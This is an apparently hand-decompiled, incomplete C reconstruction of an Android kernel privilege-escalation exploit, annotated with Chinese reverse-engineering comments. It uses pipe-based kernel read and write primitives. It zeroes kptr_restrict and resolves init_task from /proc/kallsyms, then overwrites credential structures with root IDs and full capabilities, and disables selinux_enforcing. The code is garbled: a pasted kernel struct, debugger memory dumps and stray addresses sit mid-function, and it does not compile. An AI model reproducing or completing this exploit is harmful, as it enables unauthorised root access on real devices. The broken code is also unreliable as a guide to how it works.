

typedef void (*Func1)(void* addr, void* addr2, int size);
typedef void (*Func2)();

typedef __Kernel_addr_st{
	char name[0x40];
	void* addr;
}Kernel_addr_st;

int root_flag_1 = 0;
int root_flag_2 = 0;
void* init_tassk_addr = NULL;

int validate_0_func_write(void* addr, void* addr2, int size){
	int filedes[0];
	
	pipe(filedes);
	
	write(filedes[1], addr2, size);
	if( size !=  read(filedes[0], addr, size)){
		puts("KRSLOG: ROOT FAILED (W)");
		while(1){
			sleep(0xa);
		}
	}
	
	close(filedes[0]);
	close(filedes[1]);
	return size;
}

int validate_1_func_read(void* addr, void* addr2, int size){
	int filedes[0];
	
	pipe(filedes);
	
	if( size != write(filedes[1], addr, size) ){
		puts("KRSLOG: ROOT FAILED (R)");
		while(1){
			sleep(0xa);
		}
	}
	read(filedes[0], addr2, size);
	
	close(filedes[0]);
	close(filedes[1]);
	return size;
}

root_sub_func0(const char* func_name){
	int fd;
	char buf[1];
	char buf2[1];
	char buf3[];
	void* param1;
	char param2;
	char param3[];
	Kernel_addr_st* malloc_data;
	char* ptr ;
	int res;
	if( 0 == root_flag_2 & 1 ){
		fd = open("/proc/sys/kernel/kptr_restrict", 2);
		buf[0] = '0';
		if(fd >= 1){
			write(fd, buf, 1);
			close(fd);
			sync();
			
			fd = open("/proc/sys/kernel/kptr_restrict", 0);
			if( fd >= 1 ){
				read(fd, buf, 1);
				if( '0' == buf[0] ){
					puts("/proc/sys/kernel/kptr_restrict can write"); // gl add 
				}
				close(fd);
				root_flag_2 = 1;
			}
		}else{
			puts("failed to open kptr_restrict");
		}
	}
	res = sub_40E640(....);//没搞明白干吗的
	if( 0 != res ){
		fd = open("/proc/kallsyms", 0);
		if( 0 == fd ){
			//loc_40D01C
		}else if( -1 != fd ){
			
			while( 0 != read(fd, buf2, 1) ){
				if( 0xA == buf2[0] || 0xD == buf2[0] ){
					continue;
				}
				//loc_40CF18
				ptr = buf3;
				do{
					buf2[0] = buf2[0] & 0xff;
					if( 0xA == buf2[0] || 0xD == buf2[0] ){
						break;
					}
					*ptr++ = buf2[0];
					;
				}while(0 != read(fd, buf2, 1));
				*ptr = 0;
				//loc_40CF50 
				if( 0 != strlen(buf3) ){
					if( 0 == sscanf(buf3, "%p %c %s", &param1, &param2, param3) ){
						buf3[0] = 0;
						continue;
					}
					if( 0 != strcmp(param3, func_name) ){
						buf3[0] = 0;
						continue;
					}
					malloc_data = (Kernel_addr_st*)malloc(0x48);
					snprintf(malloc_data->name, 0x40, "%s", param3);
					malloc_data->addr = param1;
					res = sub_40E5B8(...);//不知道搞啥
					//loc_40CFEC
					break;
				}else{
					puts("getline_alt got nothing!");
					//loc_40D01C
				}
				buf3[0] = 0;
			}
			//loc_40CFEC
			close(fd);
			return param1;
		}else{
			puts("failed to open kallsyms");
			//loc_40D06C--结束
		}
	}else{
		//loc_40D06C--结束
		return 0;
	}
}

void get_root_like(Func1 func1, Func2 func2){
	char* ptr0 = NULL;
	init_tassk_addr = root_sub_func0("init_task")
	if( 0 == init_tassk_addr){
		addr = 0xffffffc000800000UL;
		ptr0 = malloc(0x8000);
		func1(addr, ptr0, 0x8000);
		addr = 0xffffffc000808000UL ;
		func1(addr, ptr0, 0x4000);
		addr = 0xffffffc00080c000UL ;
		func1(addr, ptr0, 0x4000);
		addr = 0xffffffc000810000UL ;
		func1(addr, ptr0, 0x4000);
		addr = 0xffffffc000814000UL ;
		func1(addr, ptr0, 0x4000);
		addr = 0xffffffc000818000UL ;
		func1(addr, ptr0, 0x4000);
		addr = 0xffffffc00081C000UL ;
		func1(addr, ptr0, 0x4000);
		addr = 0xffffffc000820000UL ;
		func1(addr, ptr0, 0x4000);
		addr = 0xffffffc000824000UL ;
		func1(addr, ptr0, 0x4000);
		addr = 0xffffffc000828000UL ;
		func1(addr, ptr0, 0x4000);
		addr = 0xffffffc00082C000UL ;
		func1(addr, ptr0, 0x4000);
		addr = 0xffffffc000830000UL ;
		func1(addr, ptr0, 0x4000);
		0xffffffc001274000
		0xffffffc001314000
		0xffffffc001364000
		0xffffffc0013d8000
		0xffffffc001428000
		0xffffffc0014248a8
		0xffffffc001424954
		0xffffffc0014249a8
		
		
struct cred {
	atomic_t	usage;
#ifdef CONFIG_DEBUG_CREDENTIALS
	atomic_t	subscribers;	/* number of processes subscribed */
	void		*put_addr;
	unsigned	magic;
#define CRED_MAGIC	0x43736564
#define CRED_MAGIC_DEAD	0x44656144
#endif
	uid_t		uid;		/* real UID of the task */
	gid_t		gid;		/* real GID of the task */
	uid_t		suid;		/* saved UID of the task */
	gid_t		sgid;		/* saved GID of the task */
	uid_t		euid;		/* effective UID of the task */
	gid_t		egid;		/* effective GID of the task */
	uid_t		fsuid;		/* UID for VFS ops */
	gid_t		fsgid;		/* GID for VFS ops */
	unsigned	securebits;	/* SUID-less security management */
	kernel_cap_t	cap_inheritable; /* caps our children can inherit */
	kernel_cap_t	cap_permitted;	/* caps we're permitted */
	kernel_cap_t	cap_effective;	/* caps we can actually use */
	kernel_cap_t	cap_bset;	/* capability bounding set */
#ifdef CONFIG_KEYS
	unsigned char	jit_keyring;	/* default keyring to attach requested
					 * keys to */
	struct key	*thread_keyring; /* keyring private to this thread */
	struct key	*request_key_auth; /* assumed request_key authority */
	struct thread_group_cred *tgcred; /* thread-group shared credentials */
#endif
#ifdef CONFIG_SECURITY
	void		*security;	/* subjective LSM security */
#endif
	struct user_struct *user;	/* real user ID subscription */
	struct user_namespace *user_ns; /* cached user->user_ns */
	struct group_info *group_info;	/* supplementary groups for euid/fsgid */
	struct rcu_head	rcu;		/* RCU deletion hook */
};

0x7fffffbd58:   0x0000000000000a92      0x0000000000000000
0x7fffffbd68:   0x0000000000000000      0x0000000000000000
0x7fffffbd78:   0x0000000000000000      0xffffffffffffffff
0x7fffffbd88:   0xffffffffffffffff      0xffffffffffffffff
0x7fffffbd98:   0xffffffffffffffff

		func2(0xffffffc051af4b40UL, buf4, 0x48);
0x7fffffbd30:   0x0000002700000027      0x0000000000000000
0x7fffffbd40:   0x0000000000000000
		func2(0xffffffc03d039180UL, buf4, 0x18);
		
		//ffffffc0016e29cc B selinux_enforcing
		int enable = 0;
		func2(0xffffffc0016e29ccUL, &enable, 4);
		
	}
	//loc_40D8C8
}

int main(int argc, char* argv[]){
	Func1 func1 = validate_0_func_read;
	Func2 func2 = validate_0_func_write;
	
	get_root_like(func1, func2);
}